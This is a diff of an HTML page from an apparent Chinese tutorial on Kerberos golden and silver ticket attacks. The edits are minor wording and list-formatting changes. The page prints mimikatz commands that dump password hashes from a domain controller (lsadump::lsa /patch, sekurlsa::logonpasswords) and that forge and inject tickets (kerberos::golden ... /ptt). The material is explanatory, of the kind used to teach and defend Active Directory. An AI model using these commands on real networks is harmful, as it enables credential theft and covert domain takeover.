@@ -224,7 +224,7 @@ klist                      <span class="hljs-comment">//查看是否注入成功
 <li>域SID</li>
 <li>krbtgt的NTLM Hash<br>在域控中进行操作：<pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>
 lsadump::lsa /patch      <span class="hljs-comment">// 专用于在域控制器上导出用户密码或hash</span></code></pre>
-在普通用户主机进行操作：<pre><code class="hljs groovy"><span class="hljs-string">kerberos:</span>:golden <span class="hljs-regexp">/user:需要伪造的域管理员用户名 /</span><span class="hljs-string">domain:</span>demo.com <span class="hljs-regexp">/sid:域sid /</span><span class="hljs-string">krbtgt:</span> krbtgt用户的Hash <span class="hljs-regexp">/ticket:ticket.kirbi       /</span>/伪造凭证
+在普通用户主机进行操作：<pre><code class="hljs groovy"><span class="hljs-string">kerberos:</span>:golden <span class="hljs-regexp">/user:需要伪造的域管理员用户名 /</span><span class="hljs-string">domain:</span>demo.com <span class="hljs-regexp">/sid:域sid /</span><span class="hljs-string">krbtgt:</span> krbtgt用户的Hash <span class="hljs-regexp">/ticket:test.kirbi       /</span>/伪造凭证，保存为test.kirbi
 <span class="hljs-string">kerberos:</span>:ptt &lt;票据文件&gt;   <span class="hljs-comment">//注入</span>
 <span class="hljs-string">kerberos:</span>:tgt             <span class="hljs-comment">//查看当前票据</span></code></pre>
 之后即可在普通用户主机上使用net use进行登录，伪造的黄金票据可以看做一个后门</li>
@@ -245,7 +245,7 @@ lsadump::lsa /patch      <span class="hljs-comment">// 专用于在域控制器�
 <pre><code class="hljs cpp">privilege::debug         <span class="hljs-comment">//提升至debug权限</span>
 sekurlsa::logonpasswords <span class="hljs-comment">//获取hash及其他用户信息</span></code></pre>
 <p>在普通用户主机的操作：</p>
-<pre><code class="hljs groovy"><span class="hljs-string">kerberos:</span>:golden <span class="hljs-regexp">/domain:域名 /</span><span class="hljs-string">sid:</span>域SID值 <span class="hljs-regexp">/target:域控名 /</span><span class="hljs-string">rc4:</span>域控的NTLM hash <span class="hljs-regexp">/service:可利用的服务，如cifs /</span><span class="hljs-string">user:</span>要伪造的用户名，可任意填写 /ptt</code></pre>
+<pre><code class="hljs groovy"><span class="hljs-string">kerberos:</span>:golden <span class="hljs-regexp">/domain:域名 /</span><span class="hljs-string">sid:</span>域SID值 <span class="hljs-regexp">/target:域控名 /</span><span class="hljs-string">rc4:</span>域控的NTLM hash <span class="hljs-regexp">/service:可利用的服务，如cifs /</span><span class="hljs-string">user:</span>要伪造的用户名，可任意填写 /ptt 表示立即注入</code></pre>
 <p>常用的服务名有以下:</p>
 <pre><code class="hljs routeros">服务名称                    同时需要的服务
 WMI                        HOST、RPCSS
@@ -264,16 +264,16 @@ Windows Remote<span class="hljs-built_in"> Server </span>   RPCSS、LDAP、CIFS<
 </ul>
 </li>
 <li><p>加密方式不同</p>
-</li>
-<li><p>黄金票据:由Kerberos的Hash—&gt; krbtgt加密</p>
-</li>
-<li><p>白银票据:由服务器端密码的Hash值—&gt; master key 加密</p>
+<ul>
+<li>黄金票据:由Kerberos的Hash—&gt; krbtgt加密</li>
+<li>白银票据:由服务器端密码的Hash值—&gt; master key 加密</li>
+</ul>
 </li>
 <li><p>认证流程不同</p>
-</li>
-<li><p>黄金票据:利用过程需要访问域控(KDC)</p>
-</li>
-<li><p>白银票据:可以直接跳过 KDC 直接访问对应的服务器</p>
+<ul>
+<li>黄金票据:利用过程需要访问域控(KDC)</li>
+<li>白银票据:可以直接跳过 KDC 直接访问对应的服务器</li>
+</ul>
 </li>
 </ul>
 <p>参考：</p>
